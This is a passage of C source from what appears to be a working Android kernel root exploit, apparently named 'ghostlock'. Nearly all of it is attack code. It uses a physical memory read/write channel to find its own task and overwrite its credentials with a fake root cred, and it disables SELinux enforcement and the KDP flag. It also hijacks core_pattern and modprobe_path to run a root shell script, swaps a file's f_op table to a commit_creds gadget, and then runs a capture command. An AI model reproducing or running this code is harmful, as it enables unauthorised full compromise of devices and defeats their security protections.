    if (pid != (uint32_t)getpid()) {
      pr_warning("route-root: pid %u != %d — aborting\n", pid, getpid());
      return 0;
    }
  }
  pr_success("route-root: own task=%016zx\n", curr);
  return curr;
}

/* Same rq->curr find, but over the rwforge channel (rwf_phys_read).
 * Fastroot mode can reuse the primed/cached slide. */
uintptr_t rwf_find_task_current(void) {
  pr_info("rq curr: begin (slide read)\n");
  uint64_t slide;
  if (g_fastroot && g_slide_valid) {
    slide = g_slide_cached;
    pr_info("rq curr: cached slide=%016llx\n", (unsigned long long)slide);
  } else {
    uintptr_t stack_addr = data_addr(INIT_TASK) + TASK_STACK_OFF;
    uint64_t stack_va = 0;
    if (!rwf_phys_read(stack_addr, &stack_va, 8))
      pr_error("rq curr: %s read FAILED addr=%016zx\n", "init_task.stack",
               stack_addr);
    /* slide = stack_va - (KIMAGE + INIT_STACK_OFF) */
    slide = stack_va + 0x3f7db20000ULL;
    pr_info("rq curr: stack_va=%016llx slide=%016llx\n",
            (unsigned long long)stack_va, (unsigned long long)slide);
    if (slide > 0x4000000000ULL || (slide & 0x80000000001fffffULL)) {
      pr_warning("rq curr: bad slide %016llx (stack_va=%016llx) — walk fallback\n",
                 (unsigned long long)slide, (unsigned long long)stack_va);
      return 0;
    }
  }
  uintptr_t pco_addr = data_addr(PER_CPU_OFFSETS) + (long)g_route_core * 8;
  uint64_t pco = 0;
  if (!rwf_phys_read(pco_addr, &pco, 8))
    pr_error("rq curr: %s read FAILED addr=%016zx\n", "per_cpu_offset",
             pco_addr);
  uintptr_t rq = slide + (pco + RUNQUEUES);
  pr_info("rq curr: delta=%016llx rq=%016zx\n",
          (unsigned long long)pco, rq);
  if (!is_direct_ptr(rq)) {
    pr_warning("rq curr: bad rq ptr %016zx (delta=%016llx) — walk fallback\n",
               rq, (unsigned long long)pco);
    return 0;
  }
  uint64_t curr = 0;
  if (!rwf_phys_read(rq + RQ_CURR_OFF, &curr, 8))
    pr_error("rq curr: %s read FAILED addr=%016zx\n", "rq.curr",
             (size_t)(rq + RQ_CURR_OFF));
  pr_info("rq curr: curr=%016zx\n", curr);
  if (!is_direct_ptr(curr)) {
    pr_warning("rq curr: bad curr %016zx — walk fallback\n", curr);
    return 0;
  }
  if (g_fastroot && getenv("GL_FASTROOT_MINIMAL")) {
    pr_success("rq curr: own task=%016zx (fastroot, comm skipped)\n", curr);
    return curr;
  }
  uint64_t pidv = 0;
  if (!rwf_phys_read(curr + TASK_PID_OFF, &pidv, 8))
    pr_error("rq curr: %s read FAILED addr=%016zx\n", "curr.pid",
             curr + TASK_PID_OFF);
  uint32_t pid = (uint32_t)pidv;
  if (pid != (uint32_t)getpid()) {
    pr_warning("rq curr: pid %u != %d — walk fallback\n", pid, getpid());
    return 0;
  }
  if (g_fastroot) {
    pr_success("rq curr: own task=%016zx (fastroot, comm skipped)\n", curr);
    return curr;
  }
  char comm[17] = {0};
  rwf_phys_read(curr + TASK_COMM_OFF, comm, 16);
  pr_success("rq curr: own task=%016zx comm=%s\n", curr, comm);
  return curr;
}

/* Channel root: write our fake cred (spray page +0x200... the CRED_COPY
 * payload's pointer form) into task->cred and ->real_cred over the rwforge
 * physrw channel, then capture. */
void rwforge_root_and_capture(void) {
  g_fastroot = getenv("GL_RWF_FASTROOT") != NULL;
  if (g_fastroot) {
    pr_info("fastroot: begin\n");
    uintptr_t T = rwf_find_task_current();
    if (!T)
      pr_error("fastroot: task find failed\n");
    uintptr_t fake_cred = page_base + 0x200;
    pr_info("fastroot: task=%016zx cred=%016zx\n", T, fake_cred);
    if (!rwf_write64(T + TASK_CRED_OFF, fake_cred))
      pr_error("fastroot: cred write (cred) failed\n");
    pr_info("fastroot: cred1 written\n");
    if (!rwf_write64(T + TASK_REAL_CRED_OFF, fake_cred))
      pr_error("fastroot: cred write (real_cred) failed\n");
    pr_info("fastroot: cred2 written\n");
    uint32_t uid = getuid();
    pr_info("fastroot: getuid=%d\n", uid);
    if (uid != 0)
      pr_error("fastroot: cred patch did not take\n");
    pr_success("ROOTED via rwforge channel (fastroot)\n");
    goto capture_tail;
  }

  /* channel KDP-off (readback first; GL_RWF_KDP_WRITE to force) */
  uint8_t zero = 0;
  if (getenv("GL_RWF_KDP_SKIP")) {
    pr_info("kdp readback skipped (GL_RWF_KDP_SKIP)\n");
  } else {
    uint64_t rb = rwf_read64(data_addr(KDP_ENABLE));
    pr_info("kdp_enable readback=%016llx\n", (unsigned long long)rb);
    if (getenv("GL_RWF_KDP_WRITE")) {
      if (!rwf_phys_write(data_addr(KDP_ENABLE), &zero, 1))
        pr_error("kdp_enable write failed\n");
      pr_success("kdp_enable=0 written via channel\n");
    } else if ((rb & 0xff) == 0) {
      pr_success("kdp already disabled (readback 0) — skipping write\n");
    } else {
      pr_warning("kdp_enable=1 and GL_RWF_KDP_WRITE unset — leaving it on\n");
    }
  }

  /* channel SELinux off */
  int efd = open("/sys/fs/selinux/enforce", O_RDONLY);
  int enforcing = 1;
  if (efd >= 0) {
    char b[4] = {0};
    read(efd, b, sizeof(b));
    close(efd);
    enforcing = b[0] != '0';
  }
  if (!enforcing) {
    pr_info("selinux already permissive — skipping channel write\n");
  } else {
    pr_info("selinux channel write begin\n");
    rwf_phys_write(data_addr(SELINUX_ENFORCING), &zero, 1);
    pr_info("selinux channel write done\n");
  }

  int pause_sec = env_int_range("GL_RWF_PAUSE", 0, 0, 60);
  if (pause_sec >= 1) {
    pr_info("root stage: pause begin (%ds)\n", pause_sec);
    for (int i = 1; i <= pause_sec; i++) {
      sleep(1);
      pr_info("root stage: pause %d/%d alive\n", i, pause_sec);
    }
    pr_info("root stage: pause end\n");
  }

  pr_info("root stage: task find begin\n");
  uintptr_t T;
  if (getenv("GL_RWF_PERF_TASK")) {
    pr_info("perf_find_task begin\n");
    T = perf_find_task();
    pr_info("perf_find_task done %016zx\n", T);
    if (!T)
      pr_error("task find failed\n");
  } else {
    T = rwf_find_task_current();
    if (!T) {
      /* task-list walk fallback from init_task.tasks */
      pr_info("root stage: walk fallback begin\n");
      uintptr_t tasks_addr = data_addr(INIT_TASK) + TASK_TASKS_OFF;
      uintptr_t next = rwf_read64(tasks_addr + 8);  /* init_task.tasks.next */
      uint32_t mypid = getpid();
      T = 0;
      int steps = 0;
      while (next && next != tasks_addr && steps <= 0x1c) {
        uintptr_t task = next - TASK_TASKS_OFF;
        if (!is_direct_ptr(task)) {
          pr_warning("walk: bad task ptr %016zx step=%d\n", task, steps);
          T = 0;
          break;
        }
        /* one chunked read covering tasks.next .. comm area */
        uint8_t tbuf[208] = {0};
        uintptr_t raddr = task + 0x640;
        size_t left = 0xd0;
        uint8_t *dst = tbuf;
        int ok = 1;
        while (left) {
          size_t chunk = left;
          size_t page_left = 0x1000 - (raddr & 0xfff);
          if (chunk > page_left) chunk = page_left;
          if (!rwf_phys_read(raddr, dst, chunk)) { ok = 0; break; }
          raddr += chunk;
          dst += chunk;
          left -= chunk;
        }
        if (!ok) { T = 0; break; }
        uint32_t pid_off_in_buf = TASK_PID_OFF - 0x640;
        uint32_t pid;
        memcpy(&pid, tbuf + pid_off_in_buf, sizeof(pid));
        if (pid == mypid) {
          T = task;
          char comm[17] = {0};
          rwf_phys_read(T + TASK_COMM_OFF, comm, 16);
          pr_success("walk: own task=%016zx comm=%s steps=%d\n", T, comm, steps);
          break;
        }
        memcpy(&next, tbuf, 8);   /* tasks.next */
        steps++;
      }
      if (!T && steps > 0x1c)
        pr_warning("walk: task not found in 30 steps\n");
      if (!T)
        pr_error("task find failed\n");
    }
  }

  char comm[17] = {0};
  rwf_phys_read(T + TASK_COMM_OFF, comm, 16);
  pr_success("found own task=%016zx comm=%s\n", T, comm);
  uintptr_t fake_cred = page_base + 0x200;
  uint64_t sec = rwf_read64(page_base + 0x280);
  pr_info("fake cred=%016zx security_ptr=%016llx\n", fake_cred,
          (unsigned long long)sec);
  pr_info("root stage: cred install begin (task=%016zx)\n", T);
  if (!rwf_write64(T + TASK_CRED_OFF, fake_cred))
    pr_error("cred write (cred) failed\n");
  pr_info("root stage: cred written, real_cred next\n");
  if (!rwf_write64(T + TASK_REAL_CRED_OFF, fake_cred))
    pr_error("cred write (real_cred) failed\n");
  pr_info("root stage: both creds written\n");
  uint32_t uid = getuid();
  pr_info("getuid=%d\n", uid);
  if (getuid() != 0)
    pr_error("cred patch did not take\n");
  pr_success("ROOTED via rwforge channel\n");
capture_tail:
  if (getenv("GL_NO_RWF_CAPTURE")) {
    pr_info("capture skipped (GL_NO_RWF_CAPTURE)\n");
  } else {
    int cap_rc = system(CAPTURE_CMD);
    pr_info("capture rc=%d\n", cap_rc);
  }
}

/* --bootid-read <addr|img:off|bootid> [nwindows]: stand-alone oracle.
 * Each 8-byte window: retarget the sysctl boot_id data pointer at
 * (window_base - 8) via rw_trigger, read boot_id, print bytes [base, base+8). */
int run_bootid_oracle(int argc, char **argv) {
  if (argc <= 2)
    pr_error("usage: --bootid-read <addr|img:off|bootid> [nwindows]\n");
  disable_rseq_for_thread();
  set_unbuffer();
  set_limit();
  if (!active_offsets && select_offsets() < 0) return 1;
  log_startup_context();
  init_p0_profile();
  init_ashmem_path();
  pin_to_core(CORE);
  kaslr_slide = 0;
  kaslr_base = KIMAGE_TEXT_BASE;
  kaslr_done = 1;
  timer_reset();

  const char *arg = argv[2];
  uintptr_t field;
  if (!strcmp(arg, "bootid")) {
    field = data_addr(SLIDE_RANDOM_BOOT_ID_DATA_IMAGE);
  } else if (!strncmp(arg, "img:", 4)) {
    field = data_addr(KIMAGE_TEXT_BASE + strtoull(arg + 4, NULL, 16));
  } else {
    field = strtoull(arg, NULL, 16);
  }
  int nwindows = (argc == 3) ? 1 : atoi(argv[3]);
  uintptr_t sysctl = data_addr(SYSCTL_BOOTID_DATA_PTR);

  char orig[64] = {0};
  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY);
  if (fd < 0)
    pr_error("boot_id open failed errno=%d\n", errno);
  ssize_t n = read(fd, orig, 63);
  close(fd);
  if (n <= 0)
    pr_error("boot_id read failed\n");
  pr_info("oracle: field=%016zx first target=%016zx orig boot_id=%s",
          sysctl, field, orig);

  for (int win = 0; win < nwindows; win++) {
    uintptr_t target = field + (uintptr_t)win * 8;
    uintptr_t retarget = target - 8;
    int ok = 0;
    for (int att = 0; att < 24 && !ok; att++) {
      int conn = rw_trigger(retarget, sysctl);
      char buf[64] = {0};
      fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY);
      if (fd >= 0) {
        n = read(fd, buf, 63);
        close(fd);
      }
      int changed = (fd >= 0) && n >= 1 && strcmp(buf, orig) != 0;
      /* restore the retargeted pointer whenever it may have landed,
       * verified against the pre-retarget UUID (see bootid_oracle_read8) */
      if (conn || changed)
        bootid_oracle_restore_verified(sysctl, data_addr(SLIDE_SYSCTL_BOOTID_IMAGE),
                                       orig);
      if (fd >= 0) {
        if (changed) {
          uint8_t val[16] = {0};
          int nhex = 0;
          for (int i = 0; buf[i] && nhex < 32; i++) {
            int nib = hexval(buf[i]);
            if (nib < 0) continue;
            val[nhex / 2] = (uint8_t)(nib | (val[nhex / 2] << 4));
            nhex++;
          }
          if (nhex != 32)
            pr_error("oracle win %d: short UUID (%d nibbles): %s\n",
                     win, nhex, buf);
          printf("ORACLE %016zx  %02x%02x%02x%02x%02x%02x%02x%02x\n",
                 target, val[8], val[9], val[10], val[11],
                 val[12], val[13], val[14], val[15]);
          fflush(stdout);
          memcpy(orig, buf, 64);
          ok = 1;
          break;
        }
        pr_info("oracle win %d attempt %d: miss\n", win, att);
      }
    }
    if (!ok) {
      if (getenv("GL_ORACLE_SKIP")) {
        pr_warning("oracle win %d SKIPPED (24 misses) at %016zx\n", win, target);
        printf("ORACLE %016zx  0000000000000000\n", target);
        fflush(stdout);
      } else {
        pr_error("oracle win %d FAILED (24 misses) at %016zx\n", win, target);
      }
    }
  }
  pr_success("oracle: %d window(s) read\n", nwindows);
  return 0;
}

/* ------------------------------------------------------------------ */
/* route-root sub-variants (all inlined into run_rwforge in e; the two  */
/* with static rodata — modprobe pattern, wq seed — were separate fns) */
/* ------------------------------------------------------------------ */

/* GL_ROUTE_ROOT_COMMPROBE: prove the perf candidate is our own task by
 * writing "ABCDEFGH" over cand->comm and watching /proc/self/comm. */
static void route_root_commprobe(void) {
  pr_info("commprobe: begin\n");
  if (!perf_find_task())
    pr_error("commprobe: perf task find failed\n");
  char before[17] = {0};
  int cfd = open("/proc/self/comm", O_RDONLY);
  if (cfd >= 0) {
    read(cfd, before, 16);
    close(cfd);
  }
  pr_info("commprobe: comm before='%s' ncands=%d\n", before, perf_task_ncands);
  int nc = perf_task_ncands < 4 ? perf_task_ncands : 4;
  if (nc < 1)
    pr_error("commprobe: NO CHANGE across %d candidates — task-page stores dropped\n", nc);
  uint64_t abcd;
  memcpy(&abcd, "ABCDEFGH", 8);
  for (int i = 0; i < nc; i++) {
    uintptr_t cand = perf_task_cands[i];
    pr_info("commprobe: cand[%d]=%016zx votes=%d\n", i, cand,
            perf_task_cand_votes[i]);
    slab_drain();
    atomic_store(&consumer_success, 0);
    rw_trigger(abcd, cand + TASK_COMM_OFF);
    int conn = atomic_load(&consumer_success) > 0;
    pr_info("commprobe: cand[%d] write %s\n", i,
            conn ? "connected" : "NOT connected");
    usleep(300000);
    char after[17] = {0};
    cfd = open("/proc/self/comm", O_RDONLY);
    if (cfd >= 0) {
      read(cfd, after, 16);
      close(cfd);
    }
    pr_info("commprobe: comm after cand[%d]='%s'\n", i, after);
    if (strcmp(after, before)) {
      pr_success("commprobe: cand[%d] CHANGED comm — candidate correct AND task stores LAND\n", i);
      return;
    }
  }
  pr_error("commprobe: NO CHANGE across %d candidates — task-page stores dropped\n", nc);
}

/* GL_ROUTE_ROOT_COREPAT: write "|/data/local/tmp/a/r.sh" over core_pattern,
 * then crash a child → handler runs as root. */
static void route_root_corepat(void) {
  pr_info("corepat: begin\n");
  write_root_script();
  int rfd = open("/data/local/tmp/a/r.sh", O_WRONLY|O_CREAT|O_TRUNC, 0755);
  if (rfd < 0)
    pr_error("corepat: cannot write handler script\n");
  const char *rsh =
    "#!/system/bin/sh\n"
    "touch /data/local/tmp/a/.rr_rooted\n"
    "exec /system/bin/sh /data/local/tmp/.ghostlock_root.sh\n";
  write(rfd, rsh, strlen(rsh));
  close(rfd);
  unlink("/data/local/tmp/a/.rr_rooted");
  struct rlimit rl = { RLIM_INFINITY, RLIM_INFINITY };
  setrlimit(RLIMIT_CORE, &rl);
  uintptr_t cp = data_addr(CORE_PATTERN);
  const char *pat = "|/data/local/tmp/a/r.sh";
  uint64_t w0, w1, w2;
  memcpy(&w0, pat + 0, 8);
  memcpy(&w1, pat + 8, 8);
  memcpy(&w2, pat + 16, 8);
  uint64_t words[3] = { w0, w1, w2 };
  /* One round per process (redesigned after g5: every mode-3 rb write's
   * parent-side store dirties the round's spray-page struct-page flags in
   * vmemmap; corruption accumulates across in-process rounds and panics.
   * The host loop re-invokes; landed words persist in kernel .data).
   * The oracle diagnostic is gated on a persisted counter → fires every
   * 5th PROCESS. */
  uint64_t rounds = 0;
  {
    char cb[24] = {0};
    int cfd = open("/data/local/tmp/a/.corepat_rounds", O_RDONLY);
    if (cfd >= 0) {
      read(cfd, cb, 23);
      close(cfd);
      rounds = strtoull(cb, NULL, 10);
    }
  }
  int conn[3] = {0, 0, 0};
  for (int w = 0; w < 3; w++) {
    slab_drain();
    atomic_store(&consumer_success, 0);
    rw_trigger(words[w], cp + w * 8);
    conn[w] = atomic_load(&consumer_success) > 0;
  }
  pr_info("corepat: round %d writes conn=%d%d%d\n", (int)rounds,
          conn[0], conn[1], conn[2]);
  pid_t victim = fork();
  if (victim == 0) {
    struct rlimit rl2 = { RLIM_INFINITY, RLIM_INFINITY };
    setrlimit(RLIMIT_CORE, &rl2);
    signal(SIGSEGV, SIG_DFL);
    raise(SIGSEGV);
    _exit(1);
  }
  int st = 0;
  waitpid(victim, &st, 0);
  pr_info("corepat: victim exited status=%x\n", st);
  sleep(3);
  if (access("/data/local/tmp/a/.rr_rooted", F_OK) == 0) {
    pr_success("ROOTED via core_pattern handler (marker present)\n");
    run_root_captures();
    exit(0);
  }
  rounds++;
  persist_u64("/data/local/tmp/a/.corepat_rounds", rounds);
  /* every 5th process: one oracle diagnostic (land statistics) */
  if (rounds % 5 == 0) {
    int all_match = 1;
    for (int w = 0; w < 3; w++) {
      uint64_t got = 0;
      int ok = bootid_oracle_read8(cp + w * 8, &got);
      int match = ok && got == words[w];
      pr_info("corepat: diag word %d readback=%016llx want=%016llx (%s)\n",
              w, (unsigned long long)got, (unsigned long long)words[w],
              match ? "match" : "MISMATCH");
      if (!match)
        all_match = 0;
    }
    if (all_match) {
      /* pattern verified — one more crash; marker still absent means a
       * kernel-side handler restriction: stop (this process; the persisted
       * counter keeps the diagnostic cadence) */
      victim = fork();
      if (victim == 0) {
        struct rlimit rl3 = { RLIM_INFINITY, RLIM_INFINITY };
        setrlimit(RLIMIT_CORE, &rl3);
        signal(SIGSEGV, SIG_DFL);
        raise(SIGSEGV);
        _exit(1);
      }
      st = 0;
      waitpid(victim, &st, 0);
      pr_info("corepat: victim exited status=%x\n", st);
      sleep(3);
      if (access("/data/local/tmp/a/.rr_rooted", F_OK) == 0) {
        pr_success("ROOTED via core_pattern handler (marker present)\n");
        run_root_captures();
        exit(0);
      }
      pr_warning("corepat: pattern verified, handler blocked\n");
      exit(0);
    }
  }
  pr_info("corepat: round done, exiting (host loop re-invokes)\n");
  exit(0);
}

/* GL_ROUTE_ROOT_MODPROBE: write "/data/local/tmp/a/r.sh" over
 * modprobe_path, then exec a junk file → kernel runs r.sh as root. */
static __attribute__((always_inline)) void route_root_modprobe(void) {
  static const char pat[] __attribute__((used)) = "/data/local/tmp/a/r.sh";
  pr_info("modprobe: begin\n");
  write_root_script();
  int rfd = open("/data/local/tmp/a/r.sh", O_WRONLY|O_CREAT|O_TRUNC, 0755);
  if (rfd < 0)
    pr_error("modprobe: cannot write handler script\n");
  const char *rsh =
    "#!/system/bin/sh\n"
    "touch /data/local/tmp/a/.rr_rooted\n"
    "exec /system/bin/sh /data/local/tmp/.ghostlock_root.sh\n";
  write(rfd, rsh, strlen(rsh));
  close(rfd);
  /* junk binary: 64 filler bytes (cycle 0xa0..0xac) — exec fails with
   * ENOEXEC → request_module → modprobe_path runs */
  const char junk[64] = {
    0xa0,0xa1,0xa2,0xa3,0xa4,0xa5,0xa6,0xa7,0xa8,0xa9,0xaa,0xab,0xac,
    0xa0,0xa1,0xa2,0xa3,0xa4,0xa5,0xa6,0xa7,0xa8,0xa9,0xaa,0xab,0xac,
    0xa0,0xa1,0xa2,0xa3,0xa4,0xa5,0xa6,0xa7,0xa8,0xa9,0xaa,0xab,0xac,
    0xa0,0xa1,0xa2,0xa3,0xa4,0xa5,0xa6,0xa7,0xa8,0xa9,0xaa,0xab,0xac,
    0xa0,0xa1,0xa2,0xa3,0xa4,0xa5,0xa6,0xa7,0xa8,0xa9,0xaa,0xab,
  };
  int jfd = open("/data/local/tmp/a/junk", O_WRONLY|O_CREAT|O_TRUNC, 0755);
  if (jfd >= 0) {
    write(jfd, junk, sizeof(junk));
    close(jfd);
  }
  unlink("/data/local/tmp/a/.rr_rooted");
  uintptr_t mp = data_addr(MODPROBE_PATH);
  uint64_t w0, w1, w2;
  memcpy(&w0, pat + 0, 8);
  memcpy(&w1, pat + 8, 8);
  memcpy(&w2, pat + 16, 8);
  uint64_t words[3] = { w0, w1, w2 };
  /* One round per process (same g5/fuse lesson as corepat: vmemmap
   * struct-page flag corruption accumulates across in-process rounds and
   * panics; the host loop re-invokes, landed words persist in .data).
   * Oracle diagnostic gated on a persisted counter → every 5th PROCESS. */
  uint64_t rounds = 0;
  {
    char cb[24] = {0};
    int cfd = open("/data/local/tmp/a/.modprobe_rounds", O_RDONLY);
    if (cfd >= 0) {
      read(cfd, cb, 23);
      close(cfd);
      rounds = strtoull(cb, NULL, 10);
    }
  }
  int conn[3] = {0, 0, 0};
  for (int w = 0; w < 3; w++) {
    slab_drain();
    atomic_store(&consumer_success, 0);
    rw_trigger(words[w], mp + w * 8);
    conn[w] = atomic_load(&consumer_success) > 0;
  }
  pr_info("modprobe: round %d writes conn=%d%d%d\n", (int)rounds,
          conn[0], conn[1], conn[2]);
  pid_t jc = fork();
  if (jc == 0) {
    execl("/data/local/tmp/a/junk", "junk", NULL);
    _exit(1);
  }
  int st = 0;
  waitpid(jc, &st, 0);
  pr_info("modprobe: junk exec exited status=%x\n", st);
  sleep(3);
  if (access("/data/local/tmp/a/.rr_rooted", F_OK) == 0) {
    pr_success("ROOTED via modprobe_path handler (marker present)\n");
    run_root_captures();
    exit(0);
  }
  rounds++;
  persist_u64("/data/local/tmp/a/.modprobe_rounds", rounds);
  /* every 5th process: one oracle diagnostic (land statistics) */
  if (rounds % 5 == 0) {
    int all_match = 1;
    for (int w = 0; w < 3; w++) {
      uint64_t got = 0;
      int ok = bootid_oracle_read8(mp + w * 8, &got);
      int match = ok && got == words[w];
      pr_info("modprobe: diag word %d readback=%016llx want=%016llx (%s)\n",
              w, (unsigned long long)got, (unsigned long long)words[w],
              match ? "match" : "MISMATCH");
      if (!match)
        all_match = 0;
    }
    if (all_match) {
      /* pattern verified — one more trigger; marker still absent means a
       * kernel-side restriction: stop (this process) */
      jc = fork();
      if (jc == 0) {
        execl("/data/local/tmp/a/junk", "junk", NULL);
        _exit(1);
      }
      st = 0;
      waitpid(jc, &st, 0);
      pr_info("modprobe: junk exec exited status=%x\n", st);
      sleep(3);
      if (access("/data/local/tmp/a/.rr_rooted", F_OK) == 0) {
        pr_success("ROOTED via modprobe_path handler (marker present)\n");
        run_root_captures();
        exit(0);
      }
      pr_warning("modprobe: pattern verified, no trigger\n");
      exit(0);
    }
  }
  pr_info("modprobe: round done, exiting (host loop re-invokes)\n");
  exit(0);
}

/* GL_ROUTE_ROOT_FILP shared tail (also the on-device-proven part):
 * with filp-root mode armed and a slide in hand, find the leaked file,
 * swap its f_op to the payload table (T1), verify, fix up the file's
 * user_ns/ucounts links, then T2 swap to the commit gadget and ioctl. */
static __attribute__((always_inline)) int route_root_filp_tail(int64_t slide) {
  pr_info("filp-root: slide=%016llx\n", (unsigned long long)slide);
  int fd_a = open(ashmem_path, O_RDWR);
  int fd_b = open(ashmem_path, O_RDWR);
  if (fd_a < 0 || fd_b < 0)
    pr_error("filp-root: ashmem open failed\n");
  perf_find_file(fd_b, fd_a, (uint64_t)slide);
  close(fd_a);
  if (!perf_file_ncands)
    pr_error("filp-root: perf file leak failed\n");
  if (perf_file_ncands < 1)
    pr_error("filp-root: no candidate verified as struct file\n");
  int ntry = perf_file_ncands < 3 ? perf_file_ncands : 3;
  uintptr_t F = 0;
#pragma clang loop unroll(disable)
  for (int i = 0; i < ntry && !F; i++) {
    uintptr_t cand = perf_file_cands[i];
    if (!is_direct_ptr(cand)) continue;
    fops_ioctl_override = text_addr(KIMAGE_TEXT_BASE + NOOP_GADGET_OFF);
    slab_drain();
    atomic_store(&consumer_success, 0);
    do_one_write(cand + 0x10, "filp-root T1: f_op swap", 4);
    if (atomic_load(&consumer_success) > 0) {
      int rc = ioctl(fd_b, 0, 0);
      /* LOST: reconstructed — e prints the (closed) first fd as "cand %d" */
      pr_info("filp-root: cand %d leak-verify=%016zx\n", fd_a, (size_t)rc);
      if ((int64_t)rc == (int64_t)cand) {
        F = cand;
        break;
      }
      uint64_t v = 0;
      if (bootid_oracle_read8(cand + 0x10, &v)) {
        uintptr_t orig = text_addr(ASHMEM_FOPS);
        pr_info("filp-root: cand %d f_op readback=%016llx (orig fops=%016zx)\n",
                fd_a, (unsigned long long)v, orig);
      }
    } else {
      pr_warning("filp-root: T1 swap (cand %d) did not connect\n", fd_a);
    }
  }
  if (!F)
    pr_error("filp-root: no candidate verified as struct file\n");
  pr_info("filp-root: file=%016zx\n", F);
  struct { uint32_t off; uintptr_t val; } fixups[3] = {
    { 0x88, data_addr(INIT_USER_NS + 0x278) },
    { 0x90, data_addr(INIT_USER_NS) },
    { 0x98, data_addr(INIT_UCOUNTS) },
  };
  for (int i = 0; i < 3; i++) {
    slab_drain();
    atomic_store(&consumer_success, 0);
    rw_trigger(fixups[i].val, F + fixups[i].off);
    int conn = atomic_load(&consumer_success) > 0;
    pr_info("filp-root: fixup +%02zx %s\n", (size_t)fixups[i].off,
            conn ? "connected" : "NOT connected");
  }
  fops_ioctl_override = text_addr(KIMAGE_TEXT_BASE + FILP_COMMIT_GADGET_OFF);
  slab_drain();
  atomic_store(&consumer_success, 0);
  do_one_write(F + 0x10, "filp-root T2: f_op swap", 4);
  int conn = atomic_load(&consumer_success) > 0;
  pr_info("filp-root: T2 f_op swap %s\n", conn ? "connected" : "NOT connected");
  int rc = ioctl(fd_b, 0, 0);
  uint32_t uid = getuid();
  pr_info("filp-root: commit ioctl rc=%d getuid=%d\n", rc, uid);
  if (getuid() != 0)
    pr_error("filp-root: not root after commit ioctl\n");
  pr_success("ROOTED via filp-root (commit_creds on our struct file)\n");
  slab_drain();
  rw_trigger(text_addr(ASHMEM_FOPS), F + 0x10);  /* restore f_op */
  if (getenv("GL_NO_RWF_CAPTURE")) {
      pr_info("capture skipped (GL_NO_RWF_CAPTURE)\n");
    } else {
      int cap_rc = system(CAPTURE_CMD);
      pr_info("capture rc=%d\n", cap_rc);
    }
  close(fd_b);
  fops_ioctl_override = 0;
  return 0;
}

/* Own task via the channel: runqueue curr of our pinned core, validated by
 * pid == getpid().  All addressing in physmap-alias form (the channel reads
 * aliases, not canonical VAs); rwf_find_task_current can't be used here (it
 * gates the image-range rq with is_direct_ptr and always bails).  Runs after
 * the channel slide block, so kaslr_* are final. */
static uintptr_t channel_own_task(void) {
  uint64_t pco = 0;
  if (!rwf_phys_read(data_addr(PER_CPU_OFFSETS) + (long)g_route_core * 8,
                     &pco, 8))
    pr_warning("wq-umh: per_cpu_offset read failed (using 0)\n");
  if (pco >= 0x40000000ULL) {
    pr_warning("wq-umh: per_cpu_offset implausible %016llx — using 0\n",
               (unsigned long long)pco);
    pco = 0;
  }
  uintptr_t rq = data_addr(RUNQUEUES) + (uintptr_t)pco;
  uint64_t curr = 0;
  for (int t = 0; t < 3 && !is_direct_ptr(curr); t++)
    rwf_phys_read(rq + RQ_CURR_OFF, &curr, 8);
  if (!is_direct_ptr(curr)) {
    pr_warning("wq-umh: rq.curr read failed (rq=%016zx curr=%016llx)\n",
               rq, (unsigned long long)curr);
    return 0;
  }
  uint64_t pidv = 0;
  rwf_phys_read(curr + TASK_PID_OFF, &pidv, 8);
  if ((uint32_t)pidv != (uint32_t)getpid()) {
    pr_warning("wq-umh: curr pid %u != %d — wrong task\n",
               (uint32_t)pidv, getpid());
    return 0;
  }
  char comm[17] = {0};
  rwf_phys_read(curr + TASK_COMM_OFF, comm, 16);
  comm[16] = 0;
  pr_success("wq-umh: own task=%016llx pid=%u comm=%s\n",
             (unsigned long long)curr, (uint32_t)pidv, comm);
  return curr;
}

/* Resolve one of our own fds to its struct file* WITHOUT the perf file leak
 * (BZA5 device: perf_find_file finds no candidates).  Own task via
 * channel_own_task (channel-native; perf_find_task's REGS_INTR sampling +
 * 500k-prctl hammer never returns on the busy device — cycles die right
 * after "fdtable walk begin"), then task->files -> files->fdt -> fdt->fd[fd]
 * via the rwforge channel (up by the time this runs).  0 on any failed hop. */
/* perf_find_task + the 0x910 partner rule (device-proven pair).  NOTE: on the
 * busy device this can hang/panic the run (REGS_INTR sampling + 500k-prctl
 * hammer) — only use as a fallback when the channel walk failed. */
static uintptr_t perf_own_task(void) {
  if (!perf_find_task())
    return 0;
  for (int i = 0; i < perf_task_ncands; i++) {
    uintptr_t cand = perf_task_cands[i];
    for (int j = 0; j < perf_task_ncands; j++)
      if (perf_task_cands[j] == cand + (uintptr_t)TASK_COMM_OFF)
        return cand;
  }
  pr_warning("wq-umh: fdtable: no partner-validated own-task candidate (ncands=%d)\n",
             perf_task_ncands);
  return 0;
}

/* Third own-task path: walk the task list BACKWARD from init_task.tasks.prev
 * (list_add_tail ⇒ head.prev is the newest task — we're a few hops from the
 * tail, even on a busy device).  All reads are ordinary channel physical
 * reads — task pages read reliably (unlike the static percpu pages, which
 * stall through the channel).  Match on tgid == getpid(); comm logged for
 * confirmation.  Bounded at 400 hops; safe on list mutation (a freed task's
 * links fail is_direct_ptr and we bail). */
static uintptr_t listwalk_own_task(void) {
  uintptr_t head = data_addr(KIMAGE_TEXT_BASE + 0x024FCF40ULL) + TASK_TASKS_OFF;
  uint64_t cur = rwf_read64(head + 8);        /* tasks.prev = newest */
  uint64_t first = cur;
  int hops = 0;
  while (is_direct_ptr(cur) && hops < 400) {
    uintptr_t task = (uintptr_t)cur - TASK_TASKS_OFF;
    uint64_t tgid = rwf_read64(task + TASK_TGID_OFF);
    if ((uint32_t)tgid == (uint32_t)getpid()) {
      /* tgid match is sufficient (tgid collision with a *newer* task is
       * impossible — pid numbers don't recycle that fast); skip the comm
       * confirm read: one rd-ring slot fewer (the ring wraps at 32). */
      pr_success("wq-umh: own task via task-list walk: %016zx (hops=%d)\n",
                 task, hops);
      return task;
    }
    cur = rwf_read64(cur + 8);                /* prev again (backward) */
    if (cur == first || !cur)
      break;
    hops++;
  }
  pr_warning("wq-umh: task-list walk found no tgid match (hops=%d)\n", hops);
  return 0;
}

static uintptr_t fd_to_file(int fd) {
  pr_info("wq-umh: fdtable walk begin fd=%d\n", fd);
  /* cheapest proven path first: the backward task-list walk (1-2 hops in
   * practice — g4 is near the list tail); then the channel rq->curr walk
   * (static percpu pages stall through the channel); perf last (never
   * returns on the busy device). */
  uintptr_t T = g_own_task;   /* cached: the holder disarm walks fdtable too */
  if (!T) {
    T = listwalk_own_task();
